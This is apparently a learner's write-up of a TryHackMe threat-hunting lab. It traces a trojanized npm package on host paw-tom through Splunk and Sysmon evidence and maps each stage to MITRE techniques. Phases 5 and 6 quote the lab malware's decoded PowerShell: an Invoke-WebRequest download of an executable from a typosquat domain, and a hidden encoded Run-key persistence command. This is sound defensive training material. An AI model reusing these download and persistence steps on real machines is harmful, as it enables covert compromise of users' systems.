Target : THM Threat Hunting Simulator — Health Hazard

Date : 29/06/2026

This is not a shell box.
This is a `Threat Hunting` simulation on `TryHackMe`.
The work is proving a hypothesis, building a three-stage attack chain in Splunk, and filing threat reports from `Sysmon` evidence on `paw-tom`.

We'll start from intel, not from alerts.

Intel shape:

Tom (`PAW-TOM\itadmin-tom`) builds a website in `C:\Development\`.
He installs a npm package that looks like a health-check library.
Something fishy appears on the terminal after install — he did not manually run a `.ps1`.
Hypothesis to prove: compromised third-party package -> staged payload -> persistence across logons.

This is supply-chain first contact, not direct host exploit.

---

Phase 0 — cockpit orientation (Splunk panic)

Panels that mattered:

`Splunk` = search engine over security logs
`Documentation` = IOC hints and scenario framing
`Timeline` = ordered threat-report stages
`Threat Report` = graded submission form per stage

First mistake was reading the first rows on the wrong host.

`paw-penny` showed `LogonUI.exe` parented by `winlogon.exe`.
That is normal Windows login UI noise, not malware.

Scar `HH-0`: first row in a SIEM is rarely the story — scope the victim host first.

---

Phase 1 — host scope and npm hunt

We'll lock the asset before we chase techniques.

Victim host from intel: `paw-tom`
User: `PAW-TOM\itadmin-tom`

Splunk search that actually returned signal:

```spl
index=* (Image="*node.exe" OR Image="*npm*" OR Image="*npx*" OR CommandLine="*npm*" OR CommandLine="*npx*")
| head 30
```

Why this shape:

`index=*` searches all ingested buckets
`Image` catches `node.exe` even when the binary path is under `Program Files`
`CommandLine="*npm*"` catches install verbs when the process image is only `node.exe`
`| head 30` caps noise while learning

We got six events on `paw-tom` — a short burst, good for chaining.

---

Phase 2 — initial access (Stage 1 report)

Timestamp: `21/06/2025 10:58:24`

Process create (`EventCode=1`) on `node.exe`.

CommandLine tail that matters:

```text
"C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1
```

Fields read like a textbook:

`CurrentDirectory: C:\Development\` -> Tom's project folder, not Node install path
`ParentImage: powershell.exe` -> install launched from a PowerShell session
`Description: Node.js JavaScript Runtime` -> benign PE metadata on the child process, not malware masquerade

What Tom likely typed:

```powershell
npm install healthchk-lib@1.0.1
```

What Windows logged:

full `CreateProcess` string for `node.exe` running `npm-cli.js`

Direct install read:

explicit package@version in CommandLine means transitive-only pull is unlikely
if Tom had only run bare `npm install` from `package.json`, the CLI often shows no package name

Tactic filed: `Initial Access`
Technique filed: `Supply Chain Compromise` (`T1195`)

Title used:

`Initial Access via Malicious npm Package (healthchk-lib@1.0.1)`

IOCs that graded:

`healthchk-lib@1.0.1`

IOCs we should have pasted fuller:

`install healthchk-lib@1.0.1`
`C:\Development\`
`PAW-TOM\itadmin-tom`
`paw-tom`

---

Phase 3 — staging on disk (Stage 2 report)

Timestamp: `21/06/2025 10:58:27`

File create (`EventCode=11` / `FileCreate` rule):

```text
C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1
```

This is not execution yet.
This is the trojanized package dropping its lifecycle hook script during `npm install`.

npm runs `postinstall` hooks automatically — Tom does not have to double-click the `.ps1`.
That is the "fishy terminal" story without mystery transitive magic.

Tactic filed: `Initial Access` (still delivery) / sim accepted execution-adjacent staging
Technique filed: `Software Deployment Tools` (`T1072`) — npm as legitimate deploy tool placing attacker files

Do not repeat:

calling this `User Execution` — Tom did not manually execute the `.ps1`
calling this `Command and Scripting Interpreter` at file-create only — interpreter fires on the next process row, not on `EventCode 11`

---

Phase 4 — benign npm tail (noise discipline)

Right after the malicious minute, Splunk showed more `node.exe` rows at `10:58:28` and `10:59:04`.

`10:58:28` — DNS `registry.npmjs.org` from `node.exe`
Legit public npm registry pull. Not C2.

`10:59:04` — `npm-prefix.js` and `npm-cli.js list`
Housekeeping after install. Same parent `powershell.exe`, different CommandLine tail.

Scar `HH-S3`: identical parent + `node.exe` does not mean identical story — read the CommandLine tail.

```text
install healthchk-lib@1.0.1  -> attack
npm list / npm-prefix.js     -> ignore for reporting
```

We initially thought one of these had to be "execution" because they were the last process rows in the scroll window.
Wrong neighborhood. Execution and persistence were in the `10:58:27–29` cluster, not the npm cleanup tail.

---

Phase 5 — execution (hunt gap — IOC rubric pain)

The sim grades host IOC types we under-fed:

`PowerShell Command` — full `powershell.exe -NoP -W Hidden -EncodedCommand ...` process row (~`10:58:27`)
`Decoded Command` — download script body, not the persistence `Start-Process` line

Expected decoded execution shape (from scenario chain):

```powershell
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"
Invoke-WebRequest -Uri $url -OutFile $dest
```

Typosquat domain gate:

`global-update.wlndows.thm` — deliberate `wlndows` typo mimicking Windows update infrastructure
Not `registry.npmjs.org`

Parent chain expected in writeups:

`node.exe` -> `cmd.exe` -> `powershell.exe` (`-EncodedCommand`)

Splunk searches returned empty until time range and host field were fixed.

Scar `HH-S2`:

default Splunk time picker (`Last 15 minutes` / today) hides June 2025 lab data
`host=paw-tom` often fails — `ComputerName=paw-tom` or raw `paw-tom` in search string works better

Queries to rerun when reviewing:

```spl
index=* paw-tom earliest=06/21/2025:10:58:00 latest=06/21/2025:11:00 EventCode=1 Image="*powershell*"
```

```spl
index=* paw-tom "*EncodedCommand*"
```

```spl
index=* paw-tom "*wlndows*"
```

Tactic: `Execution`
Technique: `Command and Scripting Interpreter` (`T1059` parent — PowerShell sub-technique not in dropdown)

---

Phase 6 — persistence (Stage 3 report — found)

Timestamp: `21/06/2025 10:58:29`

Registry set (`EventCode=13`) on:

`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

Value name:

`Windows Update Monitor`

Value data (truncated):

```text
powershell.exe -NoP -W Hidden -EncodedCommand <REDACTED_BLOB>
```

Decoded persistence command (lab artifact):

```powershell
Start-Process 'C:\Users\Administrator\AppData\Roaming\SystemHealthUpdater.exe'
```

On Tom's host the profile path would be under his user — filename `SystemHealthUpdater.exe` is the IOC that travels.

What HKCU Run means:

programs Windows starts at user logon
attacker disguised the value name as a fake update monitor
hidden PowerShell launches the dropped binary every login

Do not repeat:

"every logon the `.ps1` runs again" — `postinstall.ps1` runs once at install
logon persistence is the Run key -> hidden PowerShell -> `Start-Process` chain

Tactic filed: `Persistence`
Technique filed: `Boot or Logon Autostart Execution` (`T1547`)

IOCs we should have listed as separate graded lines:

`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
`Windows Update Monitor`
`powershell.exe -NoP -W Hidden -EncodedCommand`
`SystemHealthUpdater.exe`
`%APPDATA%\Roaming\SystemHealthUpdater.exe`

---

Phase 7 — room results

```text
Operation: Health Hazard
Score: 295 pts
Time: ~1h 43m
Hypothesis: Proven (+60)
Attack chain: 3 stages (+235)
Techniques/tactics identified: 83%
Compromised assets detected: 100%
IOCs detected: 20%
```

Interpretation:

we cracked the case narratively
the grader wanted five named host IOC buckets; we told the story in prose and missed four typed artifacts

Graded IOC checklist for next hunt:

`NPM Package` -> `healthchk-lib@1.0.1`
`PowerShell Command` -> full encoded process CommandLine
`Decoded Command` -> Invoke-WebRequest / download URL stage
`Registry Path` -> HKCU Run full path
`Registry Value Name` -> `Windows Update Monitor`

---

Full chain (operator order)

```text
10:58:24  Tom runs npm install healthchk-lib@1.0.1 from C:\Development (PowerShell parent)
10:58:27  postinstall.ps1 created under node_modules (package staging)
10:58:27  hidden encoded PowerShell executes (download payload)  [IOCs under-fed in report]
10:58:28  DNS registry.npmjs.org (benign npm)
10:58:29  HKCU Run key "Windows Update Monitor" -> encoded Start-Process persistence
10:59:04  npm-prefix / npm list (benign cleanup)
```

MITRE spine filed:

`T1195` — supply chain via trojan npm package
`T1072` — npm deploy of malicious `postinstall.ps1`
`T1059` — PowerShell execution (encoded)
`T1547` — Run key persistence

---

Splunk literacy scars (personal)

`HH-S1`: IOC rubric 20% — paste exact artifact types, not only narrative
`HH-S2`: empty Splunk results — fix time range to `06/21/2025` or All time; use `ComputerName`/`paw-tom` not only `host=`
`HH-S3`: npm `list`/`prefix` after attack != execution
`HH-S4`: persistence is Run key, not recurring `postinstall.ps1`

Retired hypotheses:

LogonUI on `paw-penny` is the incident -> retired after host scope
`10:59:04` node rows must be execution -> retired after CommandLine tail read
transitive dependency installed `healthchk-lib@1.0.1` without direct CLI -> retired after explicit install string
Content Injection technique for npm stage -> retired; supply chain is the correct frame

---

Comprehension verdict

First defensive hunt sim where chain assembly felt fun (7/10 overall).
Splunk syntax and thousand-row noise was the un-fun half — same scar as early SIEM exposure, not incompetence.
Stronger at parent/child process reads and supply-chain framing than at graded IOC paste discipline.
Pairs naturally after `FortySeven-1` TI reading: there we merged vendor reports; here we merged `Sysmon` stages on one host.

Next rep (compass):

`HTB Traffic Analysis Pitfalls` or PCAP Sherlock — packets instead of Splunk
defer Wi-Fi hardware lane until Wireshark can read a capture without gadget guilt

Purple note for later:

defender sees `EventCode 11` on `postinstall.ps1` seconds after `node.exe install`
hunter links `ProcessGuid` from install -> file create -> powershell child -> `EventCode 13` Run key
blue win is typing all five host IOCs before submit, not only writing a correct paragraph
